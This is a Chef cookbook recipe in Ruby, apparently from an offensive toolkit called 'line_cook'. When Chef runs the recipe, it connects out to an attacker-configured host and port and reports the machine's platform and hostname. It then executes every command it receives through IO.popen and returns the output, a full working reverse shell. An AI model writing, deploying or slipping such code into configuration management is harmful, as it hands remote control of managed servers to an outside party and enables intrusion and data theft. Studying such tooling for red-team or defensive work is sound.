#
# Cookbook:: line_cook
# Recipe:: reflection
#
# Copyright:: 2020, h4ckNinja, All Rights Reserved.

ruby_block 'reflection' do
	block do
		require 'socket'


		r = TCPSocket.new(node['line_cook']['reflection']['host'], node['line_cook']['reflection']['port'])

		r.write("[!] This will cause the recipe execution to hang. Be quick to avoid timeouts. Type exit to quit.\n")
		r.write("[#{node['platform']} - #{node['fqdn']}]\n\n")


		while(true)
			cmd = r.gets

			if cmd.nil?
				break

			else
				cmd = cmd.chomp
			end


			if cmd.eql?("exit")
				break
			end

			if cmd.eql?("")
				r.print "[!] Invalid command\n"
			end

			begin
				IO.popen(cmd, 'r') do |io|
					r.print io.read
				end
			rescue SystemCallError
				r.print "[!] Invalid command\n"
			end
		end
	end

	action :run
end
